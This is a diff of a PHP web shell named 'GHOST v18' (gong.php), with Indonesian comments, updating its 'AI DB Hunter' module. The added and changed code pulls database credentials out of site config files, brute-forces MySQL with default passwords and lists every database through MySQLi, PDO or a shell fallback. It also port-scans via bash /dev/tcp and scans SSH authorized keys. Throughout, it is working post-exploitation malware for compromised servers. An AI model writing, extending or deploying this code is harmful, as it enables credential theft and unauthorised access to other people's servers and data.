@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V5: AI DB Hunter, SSH UI Fix, Deep Scanner.
+// GHOST v18 - V5.1: Fix MySQLi 7-arg, Smart DB Fallback.
 
-define('GH_VER',      '18.0.0-v5');
+define('GH_VER',      '18.0.0-v5.1');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -223,7 +223,6 @@ function gh_del($path) {
 function gh_analyze_intent($content) {
     if (!is_string($content) || $content === '') return array('score' => 0, 'reason' => 'Empty');
     $score = 0; $reasons = array();
-
     if (preg_match('/\b(eval|assert|create_function)\s*\(/i', $content)) { $score += 40; $reasons[] = "Fungsi eksekusi dinamis (eval/assert)"; }
     if (preg_match('/\b(system|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(/i', $content)) { $score += 40; $reasons[] = "Eksekusi perintah OS (system/exec)"; }
     if (preg_match('/`.*?`/s', $content) && preg_match('/\$_/', $content)) { $score += 30; $reasons[] = "Eksekusi shell via backtick (`)"; }
@@ -234,7 +233,6 @@ function gh_analyze_intent($content) {
     if (preg_match('/\b(file_get_contents|fopen|readfile|curl_exec|fsockopen)\s*\(/i', $content) && preg_match('/\$_/', $content)) { $score += 15; $reasons[] = "Input user masuk ke File/Network"; }
     if (preg_match('/\/etc\/(passwd|shadow)|wp-config\.php|\.env|\.ssh/i', $content)) { $score += 30; $reasons[] = "Target file sensitif (passwd/wp-config)"; }
     if (preg_match('/HTTP_X_AUTH/i', $content) || (preg_match('/hex2bin\(/i', $content) && preg_match('/hash_equals/i', $content))) { $score += 50; $reasons[] = "Backdoor Auth Bypass (X-Auth/Hash)"; }
-    
     return array('score' => $score, 'reason' => implode(', ', $reasons));
 }
 
@@ -340,7 +338,33 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: AI DB HUNTER (V5) ==========================================
+// ==== SECTION 4: AI DB HUNTER (V5.1 - FIXED) ================================
+function gh_db_connect($host, $user, $pass) {
+    // 1. Coba MySQLi (Max 6 argumen)
+    if (gh_can('mysqli_connect')) {
+        try {
+            $conn = @mysqli_connect($host, $user, $pass);
+            if ($conn) return $conn;
+        } catch (Throwable $e) {}
+    }
+    // 2. Coba PDO
+    if (gh_can('pdo_drivers') && in_array('mysql', @pdo_drivers())) {
+        try {
+            $pdo = new PDO("mysql:host=$host", $user, $pass, array(PDO::ATTR_TIMEOUT => 3));
+            if ($pdo) return $pdo;
+        } catch (Throwable $e) {}
+    }
+    // 3. Fallback CLI
+    if (gh_can_exec()) {
+        $cmd = 'mysql -h ' . @escapeshellarg($host) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
+        $res = gh_exec_adv($cmd);
+        if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
+            return 'CLI';
+        }
+    }
+    return false;
+}
+
 function gh_db_harvest() {
     $logs = array(); $info = array();
     $found_pass = false;
@@ -360,8 +384,6 @@ function gh_db_harvest() {
         $c = gh_read($cf);
         if ($c) {
             $logs[] = "[+] Config ditemukan: $cf";
-            
-            // Regex Parser Cerdas
             if (preg_match('/[\'"]?(?:db_)?(?:user|username|user_name|db_user)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_user = $m[1];
             elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?USER(?:NAME)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_user = $m[1];
             elseif (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = $m[1];
@@ -380,7 +402,6 @@ function gh_db_harvest() {
                 break;
             } 
             
-            // PHP Include Magic
             $logs[] = "[*] Regex gagal, mencoba Include PHP...";
             $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
             $runner = $tmp_dir . '/gh_incl_' . rand(1000,9999) . '.php';
@@ -411,11 +432,7 @@ function gh_db_harvest() {
                 @unlink($runner);
             }
             
-            if ($db_user && $db_pass) {
-                $logs[] = "[+] BERHASIL mengekstrak kredensial via PHP INCLUDE!";
-                $found_pass = true;
-                break;
-            }
+            if ($db_user && $db_pass) { $found_pass = true; break; }
         }
     }
 
@@ -460,43 +477,53 @@ function gh_db_harvest() {
     }
 
     // --- PHASE 4: AUTO-BRUTEFORCE DEFAULT CREDS ---
-    if (!$found_pass && gh_can('mysqli_connect')) {
+    if (!$found_pass) {
         $logs[] = "[*] Phase 4: Auto-Bruteforce default credentials...";
         $defaults = array(
             array('root', 'root'), array('root', ''), array('root', 'password'), array('root', 'toor'),
             array('admin', 'admin'), array('admin', ''), array('cpanel', 'cpanel')
         );
         foreach ($defaults as $creds) {
-            try {
-                $conn = @mysqli_connect('localhost', $creds[0], $creds[1], '', 3306, null, array('connect_timeout'=>1));
-                if ($conn) {
-                    $logs[] = "[!] BERHASIL BRUTEFORCE! User: {$creds[0]}, Pass: '{$creds[1]}'";
-                    $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = 'localhost';
-                    $found_pass = true;
-                    @mysqli_close($conn);
-                    break;
-                }
-            } catch (Throwable $e) {}
+            $conn = gh_db_connect('localhost', $creds[0], $creds[1]);
+            if ($conn) {
+                $logs[] = "[!] BERHASIL BRUTEFORCE! User: {$creds[0]}, Pass: '{$creds[1]}'";
+                $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = 'localhost';
+                $found_pass = true;
+                if ($conn !== 'CLI') { @mysqli_close($conn); }
+                break;
+            }
         }
     }
 
     // --- FINAL: CONNECT & DUMP DB ---
-    if ($db_user && $db_pass && gh_can('mysqli_connect')) {
+    if ($db_user && $db_pass) {
         $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
         $logs[] = "[*] Mencoba koneksi ke $db_host dengan user $db_user...";
-        try {
-            $conn = @mysqli_connect($db_host, $db_user, $db_pass, '', 3306, null, array('connect_timeout'=>3));
-            if ($conn) {
-                $logs[] = "[!] KONEKSI DATABASE BERHASIL!";
+        
+        $conn = gh_db_connect($db_host, $db_user, $db_pass);
+        if ($conn) {
+            $logs[] = "[!] KONEKSI DATABASE BERHASIL!";
+            $dbs = array();
+            
+            if ($conn === 'CLI') {
+                $res = gh_exec_adv('mysql -h ' . @escapeshellarg($db_host) . ' -u ' . @escapeshellarg($db_user) . ' -p' . @escapeshellarg($db_pass) . ' -e "SHOW DATABASES" 2>&1');
+                $lines = explode("\n", trim($res['out']));
+                foreach ($lines as $i => $l) { if ($i > 0 && trim($l)) $dbs[] = trim($l); }
+            } elseif ($conn instanceof mysqli) {
                 $q = @mysqli_query($conn, "SHOW DATABASES");
-                if ($q) {
-                    $dbs = array(); while($r = mysqli_fetch_array($q)) $dbs[] = $r[0];
-                    $info['databases'] = $dbs;
-                    $logs[] = "[*] Database ditemukan: " . implode(", ", $dbs);
-                }
+                if ($q) { while($r = mysqli_fetch_array($q)) $dbs[] = $r[0]; }
                 @mysqli_close($conn);
-            } else { $logs[] = "[-] Gagal MYSQLI: " . mysqli_connect_error(); }
-        } catch (Throwable $e) { $logs[] = "[-] MYSQLI Error: " . $e->getMessage(); }
+            } elseif ($conn instanceof PDO) {
+                $q = @$conn->query("SHOW DATABASES");
+                if ($q) { while($r = $q->fetch(PDO::FETCH_NUM)) $dbs[] = $r[0]; }
+                $conn = null;
+            }
+            
+            $info['databases'] = $dbs;
+            $logs[] = "[*] Database ditemukan: " . implode(", ", $dbs);
+        } else { 
+            $logs[] = "[-] Gagal koneksi ke database."; 
+        }
     } else { 
         if (!$found_pass) $logs[] = "[-] Semua Phase gagal. Config user/pass tidak ditemukan."; 
     }
@@ -558,16 +585,12 @@ function gh_ssh_action($action, $key) {
 function gh_port_scan($target = '127.0.0.1') {
     $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
     $bash_script = '';
-    foreach ($ports as $p) {
-        $bash_script .= " (echo > /dev/tcp/$target/$p) >/dev/null 2>&1 && echo \"$p\";";
-    }
+    foreach ($ports as $p) { $bash_script .= " (echo > /dev/tcp/$target/$p) >/dev/null 2>&1 && echo \"$p\";"; }
     $res = gh_exec_adv($bash_script, 8);
     $open = array();
     if (isset($res['out']) && is_string($res['out'])) {
         $lines = explode("\n", trim($res['out']));
-        foreach ($lines as $l) {
-            if (is_numeric(trim($l))) $open[] = array('port' => (int)trim($l));
-        }
+        foreach ($lines as $l) { if (is_numeric(trim($l))) $open[] = array('port' => (int)trim($l)); }
     }
     return $open;
 }
@@ -890,10 +913,7 @@ async function sshScan() {
     const d = await api('ssh_scan');
     if (d.err) return o.innerText = d.err;
     
-    // Tampilkan logs
     let txt = '<pre>' + d.logs.join('\n') + '</pre>';
-    
-    // Render tabel jika ada keys
     if (d.keys.length) {
         txt += `<h3 style="margin-top:15px;font-size:12px;">SSH Authorized Keys</h3>`;
         txt += `<table style="width:100%;border-collapse:collapse;margin-top:5px;font-size:11px;">`;
